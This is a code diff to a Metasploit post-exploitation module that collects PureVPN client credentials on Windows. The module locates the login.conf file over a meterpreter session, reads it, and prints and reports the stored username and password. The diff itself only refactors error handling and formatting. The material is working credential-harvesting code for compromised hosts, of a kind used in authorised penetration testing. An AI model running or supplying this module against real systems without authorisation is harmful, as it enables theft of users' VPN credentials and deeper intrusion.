@@ -5,7 +5,7 @@
 
 class MetasploitModule < Msf::Post
   include Msf::Post::Windows::Registry
-  # Rank = ExcellentRanking
+
   def initialize(info = {})
     super(update_info(info,
         'Name'          => 'Windows Gather PureVPN Client Credential Collector',
@@ -25,7 +25,8 @@ class MetasploitModule < Msf::Post
     ))
 
     register_options(
-      [OptString.new('RPATH', [false, 'Path of the PureVPN Client installation', false]) # In case software is installed in a rare directory
+      # In case software is installed in a rare directory
+      [OptString.new('RPATH', [false, 'Path of the PureVPN Client installation'])
     ])
   end
 
@@ -34,9 +35,14 @@ class MetasploitModule < Msf::Post
       print_error ('Only meterpreter sessions are supported by this post module')
       return
     end
+
     locations = get_locations
     content = get_content(locations)
-    get_client_creds(content) if content
+    if content && content !~ /^\-1\r\n$/
+      get_client_creds(content)
+    else
+      print_status("No username/password found")
+    end
   end
 
   def get_locations
@@ -74,29 +80,25 @@ class MetasploitModule < Msf::Post
 
   def get_content(locations)
     datfile = 'login.conf'
-    begin
-      locations.each do |location|
-        vprint_status("Checking for login configuration at: #{location}")
-        begin
-          files = session.fs.dir.entries(location)
-          files.map{|i| i.downcase}.uniq
-          if files.include?(datfile)
-            filepath = location + datfile
-            print_good("Configuration file found: #{filepath}")
-            print_good("Found PureVPN login configuration on #{sysinfo['Computer']} via session ID: #{session.sid}")
-            data = session.fs.file.open(filepath)
-            return data.read
-          end
-        rescue Rex::Post::Meterpreter::RequestError => e
-          vprint_error(e.message)
+    locations.each do |location|
+      vprint_status("Checking for login configuration at: #{location}")
+      begin
+        files = session.fs.dir.entries(location)
+        files.map{|i| i.downcase}.uniq
+        if files.include?(datfile)
+          filepath = location + datfile
+          print_status("Configuration file found: #{filepath}")
+          print_status("Found PureVPN login configuration on #{sysinfo['Computer']} via session ID: #{session.sid}")
+          data = session.fs.file.open(filepath)
+          return data.read
         end
+      rescue Rex::Post::Meterpreter::RequestError => e
+        vprint_error(e.message)
+        next
       end
-    rescue ::Exception => e
-      print_error(e.to_s)
-      return nil
     end
 
-    return nil
+    nil
   end
 
   def parse_file(data)
@@ -105,7 +107,8 @@ class MetasploitModule < Msf::Post
     print_good('Collected the following credentials:')
     print_good("    Username: #{username}")
     print_good("    Password: #{password}")
-    return creds
+
+    creds
   end
 
   def report_cred(creds)
